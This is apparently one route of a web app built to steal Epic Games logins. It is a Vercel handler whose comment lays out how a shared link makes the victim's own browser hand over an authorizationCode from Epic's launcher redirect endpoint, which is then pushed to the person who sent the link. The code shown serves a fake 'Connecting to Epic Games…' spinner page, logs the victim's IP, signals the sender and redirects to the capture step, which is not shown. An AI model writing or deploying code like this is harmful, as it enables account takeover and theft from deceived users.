/**
 * GET /go/:token  (routed via vercel.json from /go/*)
 *
 * Person B lands here after clicking the shared link.
 * This page:
 *  1. Signals Person A that the link was clicked (SSE 'clicked' event)
 *  2. Opens the Epic login URL in the SAME tab — no popup, no install
 *     Epic is already logged in on Person B's browser → instant JSON response
 *  3. The Epic page that loads IS the /id/api/redirect endpoint which
 *     returns JSON with authorizationCode in the page body
 *
 * BUT — we can't redirect straight to Epic because we'd lose control.
 * Instead we serve a tiny HTML page that:
 *   - Fires the 'clicked' signal to our server (fetch to /deliver?t=TOKEN&event=clicked)
 *   - Then immediately redirects Person B's browser to the Epic redirect URL
 *   - Epic shows the JSON → Person B's browser is now on epicgames.com
 *
 * For the code capture we use a different approach:
 *   We redirect to /pop/:token instead of directly to Epic.
 *   /pop serves a page that opens Epic in an iframe / does the fetch server-side.
 *
 * ACTUAL FLOW:
 *   Person B → /go/:token
 *   → tiny page fires clicked signal + redirects to /pop/:token
 *   → /pop/:token opens launcherAppClient2 redirect URL in same tab
 *   → Epic returns JSON in the page (launcherAppClient2 → localhost redirect shown as JSON)
 *   → /pop JS reads the JSON body, extracts code, POSTs to /deliver
 *   → /deliver pushes code via SSE to Person A
 */

import { getSession, pushToSSE } from './_state.js';

export default function handler(req, res) {
  // Token is the last path segment: /go/TOKEN
  const token = String(req.url.split('/').pop().split('?')[0]).trim();

  const session = getSession(token);
  if (!session) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(410).send(`<!DOCTYPE html>
<html><head><title>Expired</title>
<style>body{background:#080808;color:#888;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;}</style>
</head><body><p>This link has expired or already been used. Ask for a new one.</p></body></html>`);
  }

  const base    = `https://${req.headers.host}`;
  const popUrl  = `${base}/pop/${token}`;
  const sigUrl  = `${base}/deliver?t=${token}&event=clicked`;

  console.log(`[GO] token=${token.slice(0,8)} ip=${req.headers['x-forwarded-for'] || 'local'}`);

  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Connecting to Epic…</title>
  <style>
    body {
      background: #080808;
      color: #d0d0d0;
      font-family: -apple-system,'Segoe UI',sans-serif;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh; margin: 0;
    }
    .wrap { text-align: center; }
    .spinner {
      width: 36px; height: 36px;
      border: 3px solid #1e1e1e;
      border-top-color: #00e676;
      border-radius: 50%;
      animation: spin .7s linear infinite;
      margin: 0 auto 18px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    p { color: #555; font-size: 0.9em; }
  </style>
</head>
<body>
<div class="wrap">
  <div class="spinner"></div>
  <p>Connecting to Epic Games…</p>
</div>
<script>
// Fire 'clicked' signal — tells Person A the link was opened
fetch('${sigUrl}', { method: 'POST' }).catch(() => {});
// Redirect to /pop which handles the Epic auth
window.location.replace('${popUrl}');
</script>
</body>
</html>`);
}
